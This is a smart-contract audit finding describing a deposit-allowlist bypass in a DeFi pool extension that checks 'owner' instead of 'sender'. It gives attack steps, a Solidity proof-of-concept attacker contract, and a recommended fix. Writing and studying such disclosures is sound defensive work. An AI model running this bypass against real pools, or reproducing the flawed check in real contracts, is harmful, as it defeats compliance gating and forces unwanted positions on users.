### Title
`DepositAllowlistExtension` Checks `owner` Instead of `sender`, Allowing Any Caller to Bypass the Deposit Allowlist — (`metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

---

### Summary

`DepositAllowlistExtension.beforeAddLiquidity` gates the `addLiquidity` hook by checking the `owner` argument (the LP-position recipient) against the per-pool allowlist, not the `sender` argument (the address that actually called `pool.addLiquidity` and will pay tokens via callback). Because `owner` is a free caller-supplied parameter with no ownership check in `addLiquidity`, any unprivileged address can bypass the allowlist entirely by naming an already-allowlisted address as `owner`.

---

### Finding Description

`MetricOmmPool.addLiquidity` accepts an arbitrary `owner` address and passes both `msg.sender` (as `sender`) and `owner` to the extension hook:

```solidity
// MetricOmmPool.sol
function addLiquidity(address owner, ...) external {
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    LiquidityLib.addLiquidity(_liquidityContext(), owner, ...);   // owner gets the shares
    _afterAddLiquidity(msg.sender, owner, ...);
}
```

`ExtensionCalling._beforeAddLiquidity` forwards both fields to every configured extension:

```solidity
abi.encodeCall(IMetricOmmExtensions.beforeAddLiquidity, (sender, owner, salt, deltas, extensionData))
```

`DepositAllowlistExtension.beforeAddLiquidity` then checks only `owner`:

```solidity
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
```

`msg.sender` here is the pool (the extension is called by the pool), and `owner` is the position recipient. The actual depositor — the address that will pay tokens through the `metricOmmModifyLiquidityCallback` — is `sender`, which is silently ignored (the first parameter is unnamed `address`).

Compare with `SwapAllowlistExtension`, which correctly checks `sender`:

```solidity
function beforeSwap(address sender, address, ...) external view override returns (bytes4) {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    ...
}
```

The asymmetry is the bug. Because `addLiquidity` has no `msg.sender == owner` guard (unlike `removeLiquidity`, which does enforce `msg.sender != owner` → revert), any caller can supply an allowlisted address as `owner` and the hook passes.

**Attack path (direct call):**
1. Attacker identifies any allowlisted address `A` by reading `allowedDepositor[pool][A]`.
2. Attacker deploys a contract implementing `metricOmmModifyLiquidityCallback` that pays the required tokens.
3. Attacker calls `pool.addLiquidity(A, salt, deltas, callbackData, extensionData)`.
4. `_beforeAddLiquidity` fires; extension checks `owner = A` (allowlisted) → passes.
5. Attacker's callback pays tokens; `A` receives LP shares it never requested.

**Attack path (via `MetricOmmPoolLiquidityAdder`):**
`addLiquidityExactShares(pool, owner, ...)` only validates `owner != address(0)` and stores `msg.sender` as payer. It then calls `pool.addLiquidity(owner, ...)` where `sender` = LiquidityAdder contract. The extension still checks `owner`, so the same bypass applies through the periphery router.

---

### Impact Explanation

1. **Allowlist bypass / broken core guard**: The deposit allowlist — the primary mechanism for pool admins to control LP composition (e.g., KYC, institutional-only, compliance-gated pools) — is fully circumvented by any unprivileged caller. This is a broken core pool functionality.

2. **Forced LP position on allowlisted address**: An allowlisted address receives LP shares it never consented to. If the pool subsequently loses value (oracle drift, impermanent loss, stop-loss trigger), the allowlisted address bears the loss unless it actively removes liquidity. This is a direct analog to the Ajna pattern: a third party forces an asset position onto a victim address.

3. **Pool liquidity manipulation**: An unauthorized actor can add liquidity at arbitrary bins, shifting the pool cursor and affecting price execution for all subsequent swaps, harming existing LPs through dilution or unfavorable bin positioning.

---

### Likelihood Explanation

- `addLiquidity` is a public, permissionless entry point with no caller restriction beyond the extension hook.
- The allowlist is readable on-chain; finding a valid `owner` requires a single storage read.
- No special privileges, flash loans, or complex setup are required.
- The `MetricOmmPoolLiquidityAdder` provides a ready-made periphery path that also triggers the same bypass.

Likelihood: **High**.

---

### Recommendation

Change `DepositAllowlistExtension.beforeAddLiquidity` to check `sender` (the actual depositor/payer) instead of `owner` (the position recipient), consistent with how `SwapAllowlistExtension` checks `sender`:

```solidity
// Before (buggy):
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    ...
}

// After (fixed):
function beforeAddLiquidity(address sender, address, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    ...
}
```

If the intent is to gate by position recipient (owner), the function name `setAllowedToDeposit` and the NatSpec "Gates `addLiquidity` by depositor address" must be updated to reflect that, and the pool must add a `msg.sender == owner` enforcement in `addLiquidity` (as `removeLiquidity` already does) to prevent the forced-position attack.

---

### Proof of Concept

```solidity
// Attacker contract
contract BypassDeposit {
    IMetricOmmPool pool;
    IERC20 token0;
    IERC20 token1;

    function attack(address allowlistedOwner, LiquidityDelta calldata deltas) external {
        // Attacker pre-approves tokens to this contract
        token0.transferFrom(msg.sender, address(this), MAX);
        token1.transferFrom(msg.sender, address(this), MAX);
        token0.approve(address(pool), MAX);
        token1.approve(address(pool), MAX);

        // owner = allowlisted address → extension check passes
        // sender = address(this) → NOT on allowlist, but never checked
        pool.addLiquidity(allowlistedOwner, 0, deltas, abi.encode(KIND_PAY), "");
        // allowlistedOwner now holds LP shares; attacker paid tokens
    }

    function metricOmmModifyLiquidityCallback(uint256 a0, uint256 a1, bytes calldata) external {
        if (a0 > 0) token0.transfer(msg.sender, a0);
        if (a1 > 0) token1.transfer(msg.sender, a1);
    }
}
```

The `DepositAllowlistExtension` check at line 38 evaluates `allowedDepositor[pool][allowlistedOwner]` → `true`, so `NotAllowedToDeposit` is never thrown, and the unauthorized deposit succeeds. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** metric-periphery/contracts/extensions/DepositAllowlistExtension.sol (L32-42)
```text
  function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
      revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L182-196)
```text
  function addLiquidity(
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
  ) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (uint256 amount0Added, uint256 amount1Added) {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
      _liquidityContext(), owner, salt, deltas, callbackData, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterAddLiquidity(msg.sender, owner, salt, deltas, amount0Added, amount1Added, extensionData);
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L199-212)
```text
  function removeLiquidity(address owner, uint80 salt, LiquidityDelta calldata deltas, bytes calldata extensionData)
    external
    nonReentrant(PoolActions.REMOVE_LIQUIDITY)
    returns (uint256 amount0Removed, uint256 amount1Removed)
  {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    if (msg.sender != owner) revert NotPositionOwner();
    _beforeRemoveLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Removed, amount1Removed) = LiquidityLib.removeLiquidity(
      _liquidityContext(), owner, salt, deltas, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterRemoveLiquidity(msg.sender, owner, salt, deltas, amount0Removed, amount1Removed, extensionData);
  }
```

**File:** metric-core/contracts/ExtensionCalling.sol (L88-99)
```text
  function _beforeAddLiquidity(
    address sender,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_ADD_LIQUIDITY_ORDER,
      abi.encodeCall(IMetricOmmExtensions.beforeAddLiquidity, (sender, owner, salt, deltas, extensionData))
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L247-249)
```text
  function _validateOwner(address owner) internal pure {
    if (owner == address(0)) revert InvalidPositionOwner();
  }
```
